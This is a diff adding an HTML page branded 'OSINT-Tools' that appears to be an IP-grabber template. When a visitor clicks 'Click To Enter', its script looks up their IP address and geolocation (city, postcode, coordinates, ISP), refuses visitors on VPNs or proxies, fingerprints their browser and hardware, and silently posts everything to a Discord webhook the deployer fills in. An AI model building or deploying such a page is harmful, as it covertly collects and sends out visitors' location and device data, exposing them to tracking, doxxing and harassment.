@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OSINT-Tools</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace, 'monospace';
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+            color: #fff;
+            background-color: #000;
+        }
+        
+        #entry-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            z-index: 100;
+        }
+        
+        #enter-text {
+            color: #00ff00;
+            font-size: clamp(1.5em, 5vw, 2em);
+            text-shadow: 0 0 5px #00ff00;
+            animation: blink 1.5s infinite;
+            text-align: center;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        #main-content {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+        
+        #background-gif {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+            opacity: 0.7;
+        }
+        
+        #info-display {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            font-family: 'Courier New', monospace, 'monospace';
+            white-space: pre;
+            line-height: 1.4;
+            color: #fff;
+            max-width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            font-size: clamp(16px, 5vw, 32px);
+            font-weight: bold;
+            text-transform: uppercase;
+            text-align: center;
+        }
+        
+        .info-line {
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeInZoom 0.5s forwards;
+            text-align: center;
+            font-size: inherit;
+        }
+        
+        @keyframes fadeInZoom {
+            from {
+                opacity: 0;
+                transform: translateY(20px) scale(0.8);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+        
+        #info-display::-webkit-scrollbar {
+            display: none;
+        }
+        #info-display {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="entry-screen">
+        <div id="enter-text" style="text-align: center;">Click To Enter</div>
+    </div>
+
+    <div id="main-content">
+        <img id="background-gif" src="men.gif" alt="Background">
+        <div id="info-display"></div>
+    </div>
+    
+    <audio id="background-music" loop>
+        <source src="men.mp3" type="audio/mpeg">
+        <source src="men.mp3" type="audio/wav">
+    </audio>
+
+    <script>
+        document.getElementById('entry-screen').addEventListener('click', async function() {
+            this.style.display = 'none';
+            document.getElementById('main-content').style.display = 'block';
+            
+            const music = document.getElementById('background-music');
+            music.volume = 0.5;
+            if (music.paused) {
+                music.play().catch(e => console.log("Auto-play prevented:", e));
+            }
+            
+            // Fetch IP data
+            try {
+                const [ipData, ipv4Data, ipv6Data] = await Promise.all([
+                    fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({})),
+                    fetch('https://api.ipify.org?format=json').then(res => res.json()).catch(() => ({ ip: 'UNKNOWN' })),
+                    fetch('https://api64.ipify.org?format=json').then(res => res.json()).catch(() => ({ ip: 'UNKNOWN' }))
+                ]);
+
+                // --- VPN DETECTION ---
+                const suspicious = /(vpn|proxy|hosting|datacenter|cloud|amazon|digitalocean|ovh|azure|google)/i;
+                if (ipData.org && suspicious.test(ipData.org)) {
+                    document.body.innerHTML = `
+                        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#f00;font-family:monospace;font-size:2em;text-align:center;">
+                            ❌ ACCESS DENIED<br><br>VPN/Proxy Detected 
+                            OSINTTOOLS CANT HAVE BOTS TURN OFF THE VPN/PROXY
+                            AND COMEBACK
+                        </div>
+                    `;
+                    return; // Stop rest of script
+                }
+                // --- END VPN DETECTION ---
+
+                const ipv4 = ipv4Data.ip && ipv4Data.ip.includes('.') ? ipv4Data.ip : 'UNKNOWN';
+                const ipv6 = ipv6Data.ip && ipv6Data.ip.includes(':') ? ipv6Data.ip : 'UNKNOWN';
+                const now = new Date();
+
+                let gpuInfo = 'Unknown';
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            gpuInfo = `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)} (${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)})`;
+                        } else {
+                            gpuInfo = 'Not supported';
+                        }
+                    }
+                } catch (e) {
+                    console.error("GPU detection error:", e);
+                    gpuInfo = 'Not supported';
+                }
+
+                const memoryInfo = performance.memory ? (performance.memory.totalJSHeapSize / 1024 / 1024).toFixed(0) : 'Not supported';
+                const orientation = screen.orientation ? screen.orientation.type : window.orientation ? (window.orientation === 0 || window.orientation === 180 ? 'portrait' : 'landscape') : 'Unknown';
+
+                const infoLines = [
+                    `IP: ${ipv4}`,
+                    `IP v6: ${ipv6}`,
+                    `COUNTRY: ${ipData.country_name || 'UNKNOWN'}`,
+                    `REGION: ${ipData.region || 'UNKNOWN'}`,
+                    `CITY: ${ipData.city || 'UNKNOWN'}`,
+                    `ZIP CODE: ${ipData.postal || 'UNKNOWN'}`,
+                    `FULL LOCATION: ${ipData.city ? `${ipData.city}, ${ipData.region}, ${ipData.country_name}` : 'UNKNOWN'}`,
+                    `LATITUDE: ${ipData.latitude || 'UNKNOWN'}`,
+                    `LONGITUDE: ${ipData.longitude || 'UNKNOWN'}`,
+                    `TIMEZONE: ${ipData.timezone || 'UNKNOWN'}`,
+                    `CURRENT TIME: ${now.toLocaleDateString('en-GB')}, ${now.toLocaleTimeString('en-GB')}`,
+                    `ISP: ${ipData.org || 'UNKNOWN'}`,
+                    `ORGANIZATION: ${ipData.org || 'UNKNOWN'}`,
+                    `AUTONOMOUS SYSTEM: ${ipData.asn || 'UNKNOWN'}`,
+                    `REFERENCE: NONE`,
+                    `SYSTEM LANGUAGES: ${navigator.languages.join(', ') || 'UNKNOWN'}`,
+                    `SCREEN WIDTH: ${screen.width || 'UNKNOWN'}`,
+                    `SCREEN HEIGHT: ${screen.height || 'UNKNOWN'}`,
+                    `WINDOW WIDTH: ${window.innerWidth || 'UNKNOWN'}`,
+                    `WINDOW HEIGHT: ${window.innerHeight || 'UNKNOWN'}`,
+                    `DISPLAY PIXEL DEPTH: ${screen.pixelDepth || 'UNKNOWN'}`,
+                    `SCREEN ORIENTATION: ${orientation}`,
+                    `SCREEN ROTATION: ${window.orientation || '0'}`,
+                    `CPU THREADS: ${navigator.hardwareConcurrency || 'UNKNOWN'}`,
+                    `AVAILABLE BROWSER MEMORY: ${memoryInfo} MB`,
+                    `GPU VENDOR: ${gpuInfo}`
+                ];
+
+                // Send to Discord webhook immediately
+                const webhookUrl = 'REPLACE THIS WITH UR WEBHOOK';
+                const payload = {
+                    content: `**OSINT-Tools Results <@REPLACE WITH UR DISCORD ID>**\n\`\`\`\n${infoLines.join('\n')}\n\`\`\``
+                };
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                }).catch(error => console.error('Error sending to Discord:', error));
+
+                // Display info on the page after sending
+                displaySystemInfo(infoLines);
+
+            } catch (error) {
+                console.error("Error fetching data:", error);
+                const display = document.getElementById('info-display');
+                const errorElement = document.createElement('div');
+                errorElement.className = 'info-line';
+                errorElement.textContent = 'ERROR LOADING SYSTEM INFORMATION';
+                display.appendChild(errorElement);
+            }
+        });
+        
+        function displaySystemInfo(infoLines) {
+            const display = document.getElementById('info-display');
+            display.innerHTML = '';
+            let currentFontSize = 48;
+            infoLines.forEach((line, index) => {
+                setTimeout(() => {
+                    const lineElement = document.createElement('div');
+                    lineElement.className = 'info-line';
+                    lineElement.textContent = line;
+                    lineElement.style.animationDelay = `${index * 100}ms`;
+                    display.appendChild(lineElement);
+                    currentFontSize = Math.max(16, currentFontSize - 1);
+                    Array.from(display.children).forEach(child => {
+                        child.style.fontSize = `${currentFontSize}px`;
+                    });
+                    display.scrollTop = display.scrollHeight;
+                }, index * 100);
+            });
+        }
+    </script>
+</body>
+</html>
